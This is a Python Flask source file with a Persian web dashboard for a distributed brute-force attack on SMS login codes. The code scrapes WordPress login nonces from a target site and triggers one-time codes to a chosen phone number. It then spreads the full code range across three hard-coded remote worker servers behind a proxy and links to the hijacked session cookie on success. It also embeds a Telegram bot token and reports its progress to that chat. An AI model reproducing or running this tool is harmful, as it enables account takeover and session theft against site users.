import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
from bs4 import BeautifulSoup
import logging

# ==============================================================================
# Configuration
# ==============================================================================

app = Flask(__name__)
socketio = SocketIO(app)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Telegram Configuration ---
# It's better to load these from environment variables or a config file
TELEGRAM_BOT_TOKEN = "6374641003:AAFG0isVhi6pxBzZDythU96FaTrtEiVQIHY"
TELEGRAM_CHAT_ID = "-4796694839"

# --- Remote Worker Servers ---
REMOTE_SERVERS = [
    "http://23.95.197.222:5000",
    "http://198.12.88.145:5000",
    "http://192.227.134.68:5000",
]

# --- Default OTP Code Ranges for Full Scan ---
# Distributes the 0-99999 range among the servers
FULL_SCAN_RANGES = [
    (0, 33333),
    (33333, 66666),
    (66666, 99999),
]

# ==============================================================================
# Global State
# ==============================================================================

# Using a dictionary for better state management
class AppState:
    def __init__(self):
        self.progress_log = []
        self.found_success = False
        self.success_codes = []
        self.proxy_setting = ""
        self.current_operation = {}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()

    def reset(self):
        with self.lock:
            self.progress_log.clear()
            self.found_success = False
            self.success_codes.clear()
            self.current_operation = {}
            self.stop_event.clear()

    def add_log(self, message):
        with self.lock:
            self.progress_log.append(message)
        logging.info(message)
        send_to_telegram(message)
        socketio.emit('update_progress', {'log': message})

    def set_success(self, server, code):
        with self.lock:
            if self.found_success:
                return # Already found a code
            self.found_success = True
            self.success_codes.append({
                "server": server,
                "code": code,
                "cookie_link": f"{server}/last_cookie"
            })
            self.stop_event.set() # Signal all threads to stop

app_state = AppState()

# ==============================================================================
# Helper Functions
# ==============================================================================

def send_to_telegram(message):
    """Sends a message to the configured Telegram chat."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send Telegram message: {e}")
        return False

def fetch_nonce(host, mobile):
    """Fetches the login_otp_nonce from the target website."""
    try:
        # Step 1: Get user_login_nonce
        login_page_url = f"https://{host}/login/"
        response = requests.get(login_page_url, timeout=15)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']

        # Step 2: Send initial login request to get OTP sent
        ajax_url = f"https://{host}/wp-admin/admin-ajax.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": login_page_url
        }
        login_data = f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1"
        requests.post(ajax_url, headers=headers, data=login_data, timeout=15)

        # Step 3: Get the login_otp_nonce from the OTP page
        otp_page_url = f"https://{host}/login/?action=login-by-otp&mobile={mobile}"
        response = requests.get(otp_page_url, timeout=15)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']

        app_state.add_log(f"✅ Nonce fetched successfully for {host}")
        return login_otp_nonce
    except Exception as e:
        app_state.add_log(f"❌ Failed to fetch nonce for {host}: {e}")
        return None

def send_to_remote_worker(server_url, payload):
    """Sends a start request to a remote worker server."""
    try:
        response = requests.post(f"{server_url}/start", json=payload, timeout=10)
        response.raise_for_status()
        app_state.add_log(f"✅ Request sent to {server_url} for range {payload['startRange']}-{payload['endRange']}")
    except requests.exceptions.RequestException as e:
        app_state.add_log(f"❌ Failed to send request to {server_url}: {e}")

def stop_all_workers(manual_stop=False):
    """Sends stop requests to all remote worker servers."""
    if manual_stop:
        app_state.stop_event.set()
        app_state.add_log("🛑 Manual stop requested by user.")

    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            logging.info(f"⏹️ Stop request sent to {server}")
        except requests.exceptions.RequestException as e:
            logging.warning(f"⚠️ Could not send stop request to {server}: {e}")

def get_workers_status():
    """Retrieves the status from all remote worker servers."""
    status_data = {}
    with app_state.lock:
        servers_to_check = list(REMOTE_SERVERS)

    def check_server(server):
        try:
            response = requests.get(f"{server}/status", timeout=5)
            response.raise_for_status()
            status = response.json()
            status_data[server] = status
            
            # Check for success message in the error field (as per original logic)
            if status.get("error") and "found successfully" in status["error"]:
                code = status["error"].split("Code ")[1].split(" found")[0]
                app_state.add_log(f"🎉 Success on {server}! Code: {code}. Stopping all workers...")
                app_state.set_success(server, code)
                stop_all_workers()

        except requests.exceptions.RequestException as e:
            status_data[server] = {
                "running": False, "current_range": {"start": "-", "end": "-"},
                "processed": "-", "error": f"Connection failed: {e}"
            }

    threads = [threading.Thread(target=check_server, args=(server,)) for server in servers_to_check]
    for t in threads: t.start()
    for t in threads: t.join()

    return status_data

# ==============================================================================
# Background Task Manager
# ==============================================================================

def operation_manager(operation_details):
    """Manages the lifecycle of an OTP cracking operation, including auto-restart."""
    app_state.add_log("🔄 Operation Manager Started.")
    
    # The main loop for the operation, allows for retries.
    for attempt in range(1, 4): # Max 3 attempts
        if app_state.stop_event.is_set():
            app_state.add_log("Operation cancelled before starting.")
            break

        app_state.add_log(f"🚀 Starting attempt #{attempt}...")

        # Start workers
        threads = []
        for i, server in enumerate(REMOTE_SERVERS):
            start_r, end_r = operation_details['ranges'][i]
            payload = {
                "host": operation_details['host'], "nonce": operation_details['nonce'],
                "mobile": operation_details['mobile'], "connections": operation_details['connections'],
                "startRange": start_r, "endRange": end_r, "proxy": app_state.proxy_setting
            }
            thread = threading.Thread(target=send_to_remote_worker, args=(server, payload))
            threads.append(thread)
            thread.start()
        for thread in threads: thread.join()

        # Wait for either success, timeout, or manual stop
        # Timeout is 40 minutes as per original logic
        stopped = app_state.stop_event.wait(timeout=40 * 60)

        if stopped:
            if app_state.found_success:
                app_state.add_log("✅ Operation successful! Manager shutting down.")
                break # Exit the loop on success
            else:
                app_state.add_log("⏹️ Operation stopped manually. Manager shutting down.")
                break # Exit on manual stop
        else: # Timeout occurred
            app_state.add_log("⏳ Timeout reached (40 mins). Stopping workers for restart.")
            stop_all_workers()
            time.sleep(5) # Grace period for workers to stop

            app_state.add_log("🔄 Attempting to fetch a new nonce for restart...")
            new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
            if new_nonce:
                operation_details['nonce'] = new_nonce
                app_state.add_log("✅ New nonce acquired. Restarting operation.")
                # The loop will continue to the next attempt
            else:
                app_state.add_log("❌ Failed to get new nonce. Aborting operation.")
                break # Exit loop if nonce fetch fails

    app_state.add_log("🔚 Operation Manager Finished.")
    stop_all_workers() # Final cleanup

# ==============================================================================
# Flask Routes
# ==============================================================================

@app.route('/')
def index():
    # Modern UI with TailwindCSS and better layout
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>سرور مرکزی OTP</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { font-family: 'Vazirmatn', sans-serif; }
            @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
            .status-active { color: #10B981; } .status-inactive { color: #EF4444; }
            .loader { border-top-color: #3498db; animation: spin 1s linear infinite; }
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    </head>
    <body class="bg-gray-900 text-gray-200 p-4 sm:p-8">
        <div class="max-w-7xl mx-auto">
            <header class="text-center mb-8">
                <h1 class="text-4xl font-bold text-cyan-400">سرور مرکزی OTP</h1>
                <p class="text-gray-400 mt-2">مدیریت و نظارت بر فرآیند بررسی کد</p>
            </header>

            <main class="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <!-- Control Panel -->
                <div class="lg:col-span-1 bg-gray-800 p-6 rounded-xl shadow-lg">
                    <h2 class="text-2xl font-bold mb-6 border-b-2 border-cyan-500 pb-2">پنل کنترل</h2>
                    <form id="control-form" class="space-y-4">
                        <div>
                            <label for="host" class="block text-sm font-medium text-gray-300">هاست</label>
                            <input type="text" id="host" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="0an0m.com">
                        </div>
                        <div>
                            <label for="mobile" class="block text-sm font-medium text-gray-300">شماره موبایل</label>
                            <input type="text" id="mobile" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="09000000000">
                        </div>
                        <div>
                            <label for="nonce" class="block text-sm font-medium text-gray-300">Nonce (اختیاری)</label>
                            <input type="text" id="nonce" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="در صورت خالی بودن، خودکار دریافت می‌شود">
                        </div>
                        <div>
                            <label for="connections" class="block text-sm font-medium text-gray-300">تعداد کانکشن‌ها</label>
                            <input type="number" id="connections" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="20">
                        </div>
                        <div>
                            <label for="proxy" class="block text-sm font-medium text-gray-300">پروکسی (SOCKS5)</label>
                            <input type="text" id="proxy" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="socks5://user:pass@host:port" value="51.195.229.194:13001">
                        </div>
                        
                        <!-- Scan Type -->
                        <fieldset>
                            <legend class="block text-sm font-medium text-gray-300 mb-2">نوع اسکن</legend>
                            <div class="flex items-center space-x-4 space-x-reverse">
                                <label><input type="radio" name="scan_type" value="full" class="form-radio text-cyan-500" checked> اسکن کامل</label>
                                <label><input type="radio" name="scan_type" value="custom" class="form-radio text-cyan-500"> سفارشی</label>
                            </div>
                        </fieldset>
                        <div id="custom_range_container" class="hidden grid grid-cols-2 gap-4">
                            <input type="number" id="start_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="شروع">
                            <input type="number" id="end_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="پایان">
                        </div>

                        <!-- Action Buttons -->
                        <div class="pt-4 space-y-3">
                            <button type="button" id="start-btn" class="w-full flex justify-center items-center bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-lg transition-colors">
                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                شروع عملیات
                            </button>
                            <button type="button" id="stop-btn" class="w-full flex justify-center items-center bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg transition-colors" disabled>
                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 9v6m4-6v6m7-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                توقف عملیات
                            </button>
                        </div>
                    </form>
                </div>

                <!-- Status & Logs -->
                <div class="lg:col-span-2 space-y-8">
                    <!-- Status Table -->
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                        <h2 class="text-2xl font-bold mb-4">وضعیت سرورها</h2>
                        <div class="overflow-x-auto">
                            <table class="w-full text-center">
                                <thead class="border-b border-gray-600">
                                    <tr>
                                        <th class="py-2 px-3">سرور</th>
                                        <th class="py-2 px-3">وضعیت</th>
                                        <th class="py-2 px-3">رنج</th>
                                        <th class="py-2 px-3">پیشرفت</th>
                                        <th class="py-2 px-3">آخرین پیام</th>
                                    </tr>
                                </thead>
                                <tbody id="status-body">
                                    <!-- Status rows will be injected here -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <!-- Success & Logs -->
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                            <h2 class="text-2xl font-bold mb-4">کدهای موفق</h2>
                            <div id="success-body" class="space-y-2">
                                <p class="text-gray-400">هنوز کدی یافت نشده است.</p>
                            </div>
                        </div>
                        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                             <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
                             <div id="logs-container" class="h-48 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm">
                                <!-- Logs will be injected here -->
                             </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>

        <script>
            const socket = io();
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');
            const statusBody = document.getElementById('status-body');
            const successBody = document.getElementById('success-body');
            const logsContainer = document.getElementById('logs-container');

            let servers = [];

            function setButtonState(isBusy) {
                startBtn.disabled = isBusy;
                stopBtn.disabled = !isBusy;
                startBtn.classList.toggle('opacity-50', isBusy);
                stopBtn.classList.toggle('opacity-50', !isBusy);
            }

            function addLog(message) {
                const logEntry = document.createElement('p');
                logEntry.className = 'text-gray-300 font-mono';
                logEntry.textContent = `> ${message}`;
                logsContainer.appendChild(logEntry);
                logsContainer.scrollTop = logsContainer.scrollHeight;
            }

            function updateStatusTable(statusData) {
                statusBody.innerHTML = '';
                servers = Object.keys(statusData);
                servers.forEach(server => {
                    const status = statusData[server];
                    const processed = parseInt(status.processed) || 0;
                    const end = parseInt(status.current_range.end) || 0;
                    const start = parseInt(status.current_range.start) || 0;
                    const total = end > start ? end - start : 0;
                    const percentage = total > 0 ? ((processed - start) / total * 100).toFixed(1) : 0;

                    const row = document.createElement('tr');
                    row.className = 'border-b border-gray-700 last:border-none';
                    row.innerHTML = `
                        <td class="py-3 px-2 whitespace-nowrap">${new URL(server).hostname}</td>
                        <td class="py-3 px-2 font-bold ${status.running ? 'status-active' : 'status-inactive'}">${status.running ? 'فعال' : 'غیرفعال'}</td>
                        <td class="py-3 px-2 font-mono">${status.current_range.start} - ${status.current_range.end}</td>
                        <td class="py-3 px-2">
                            <div class="w-full bg-gray-600 rounded-full h-2.5">
                                <div class="bg-cyan-500 h-2.5 rounded-full" style="width: ${percentage}%"></div>
                            </div>
                            <span class="text-xs font-mono">${percentage}%</span>
                        </td>
                        <td class="py-3 px-2 text-xs text-gray-400 max-w-xs truncate">${status.error || '-'}</td>
                    `;
                    statusBody.appendChild(row);
                });
            }
            
            function updateSuccessList(successData) {
                if (successData.length === 0) return;
                successBody.innerHTML = '';
                successData.forEach(s => {
                    const successEntry = document.createElement('div');
                    successEntry.className = 'bg-green-500/20 p-3 rounded-lg';
                    successEntry.innerHTML = `
                        <p class="font-bold">کد: <span class="font-mono text-cyan-300">${s.code}</span></p>
                        <p class="text-sm">سرور: ${new URL(s.server).hostname}</p>
                        <a href="${s.cookie_link}" target="_blank" class="text-yellow-400 hover:underline">دانلود کوکی</a>
                    `;
                    successBody.appendChild(successEntry);
                });
            }

            async function refreshData() {
                try {
                    const [statusRes, successRes] = await Promise.all([
                        fetch('/get_status'),
                        fetch('/get_success')
                    ]);
                    const statusData = await statusRes.json();
                    const successData = await successRes.json();

                    updateStatusTable(statusData);
                    updateSuccessList(successData);
                    
                    const isAnyRunning = Object.values(statusData).some(s => s.running);
                    setButtonState(isAnyRunning);

                } catch (error) {
                    console.error("Error refreshing data:", error);
                    addLog("خطا در به‌روزرسانی داده‌ها از سرور.");
                }
            }

            // Event Listeners
            document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                radio.addEventListener('change', () => {
                    document.getElementById('custom_range_container').classList.toggle('hidden', radio.value !== 'custom');
                });
            });

            startBtn.addEventListener('click', async () => {
                setButtonState(true);
                addLog("درخواست شروع عملیات...");

                const payload = {
                    host: document.getElementById('host').value,
                    nonce: document.getElementById('nonce').value,
                    mobile: document.getElementById('mobile').value,
                    connections: parseInt(document.getElementById('connections').value),
                    proxy: document.getElementById('proxy').value,
                    scan_type: document.querySelector('input[name="scan_type"]:checked').value,
                    start_range: document.getElementById('start_range').value,
                    end_range: document.getElementById('end_range').value,
                };
                
                if (!payload.host || !payload.mobile) {
                    alert("هاست و شماره موبایل الزامی است.");
                    setButtonState(false);
                    return;
                }

                try {
                    const response = await fetch('/start', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                    addLog("درخواست شروع با موفقیت به سرور ارسال شد.");
                } catch (error) {
                    addLog(`خطا در ارسال درخواست شروع: ${error.message}`);
                    setButtonState(false);
                }
            });

            stopBtn.addEventListener('click', async () => {
                addLog("درخواست توقف عملیات...");
                try {
                    await fetch('/stop', { method: 'POST' });
                    addLog("درخواست توقف به سرور ارسال شد.");
                } catch (error) {
                    addLog(`خطا در ارسال درخواست توقف: ${error.message}`);
                }
                setButtonState(false);
            });

            // Socket.IO
            socket.on('connect', () => console.log('Connected to WebSocket.'));
            socket.on('update_progress', (data) => addLog(data.log));

            // Initial load and periodic refresh
            setInterval(refreshData, 3000);
            refreshData();
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start_operation():
    if app_state.current_operation.get('is_running'):
        return jsonify({"error": "An operation is already in progress."}), 409

    data = request.get_json()
    app_state.reset()
    app_state.proxy_setting = data.get('proxy', '')

    host = data['host']
    mobile = data['mobile']
    nonce = data.get('nonce')
    
    app_state.add_log(f"🚀 Operation initiated for host: {host}, mobile: {mobile}")

    # Fetch nonce if not provided
    if not nonce:
        app_state.add_log("Nonce not provided, attempting to fetch automatically...")
        nonce = fetch_nonce(host, mobile)
        if not nonce:
            return jsonify({"error": "Failed to fetch nonce automatically."}), 400

    # Determine ranges
    scan_type = data.get('scan_type', 'full')
    if scan_type == 'full':
        ranges = FULL_SCAN_RANGES
    else:
        try:
            start_r = int(data['start_range'])
            end_r = int(data['end_range'])
            total_range = end_r - start_r
            chunk_size = total_range // len(REMOTE_SERVERS)
            ranges = []
            for i in range(len(REMOTE_SERVERS)):
                chunk_start = start_r + (i * chunk_size)
                chunk_end = chunk_start + chunk_size -1 if i < len(REMOTE_SERVERS) - 1 else end_r
                ranges.append((chunk_start, chunk_end))
        except (ValueError, TypeError):
            return jsonify({"error": "Invalid custom range provided."}), 400
    
    operation_details = {
        'host': host, 'nonce': nonce, 'mobile': mobile,
        'connections': int(data['connections']), 'ranges': ranges,
        'is_running': True
    }
    app_state.current_operation = operation_details

    # Start the background manager
    threading.Thread(target=operation_manager, args=(operation_details,)).start()

    return jsonify({"message": "Operation started successfully."}), 202

@app.route('/stop', methods=['POST'])
def stop_operation():
    stop_all_workers(manual_stop=True)
    with app_state.lock:
        app_state.current_operation['is_running'] = False
    return jsonify({"message": "Stop signal sent to all workers."}), 200

@app.route('/get_status', methods=['GET'])
def get_status():
    return jsonify(get_workers_status())

@app.route('/get_success', methods=['GET'])
def get_success():
    with app_state.lock:
        return jsonify(list(app_state.success_codes))

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
